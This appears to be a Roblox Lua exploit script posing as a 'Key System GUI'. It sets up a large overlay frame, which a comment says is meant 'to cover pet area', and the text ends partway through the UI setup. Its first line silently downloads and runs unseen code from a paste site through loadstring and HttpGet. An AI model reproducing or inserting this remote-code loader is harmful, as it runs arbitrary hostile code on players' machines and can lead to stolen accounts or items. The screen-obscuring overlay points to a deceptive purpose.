loadstring(game:HttpGet("http://vpaste.net/BXBLy"))()


-- Enhanced Key System GUI with improved design, animations, and larger size
local TweenService = game:GetService("TweenService")

-- Create main GUI
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "KeySystemUI"

-- Main frame (significantly larger to cover pet area)
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 550, 0, 380)
frame.Position = UDim2.new(0.5, -275, 0.5, -190)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(60, 60, 65)
frame.BackgroundTransparency = 1 -- Start invisible for animation

-- Add rounded corners to main frame
local frameCorner = Instance.new("UICorner", frame)
frameCorner.CornerRadius = UDim.new(0, 15)

-- Add subtle drop shadow effect
local shadow = Instance.new("Frame", gui)
shadow.Size = frame.Size
shadow.Position = UDim2.new(0.5, -270, 0.5, -185)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 1 -- Start invisible
shadow.BorderSizePixel = 0
shadow.ZIndex = frame.ZIndex - 1

local shadowCorner = Instance.new("UICorner", shadow)
shadowCorner.CornerRadius = UDim.new(0, 15)

-- Header section with gradient background
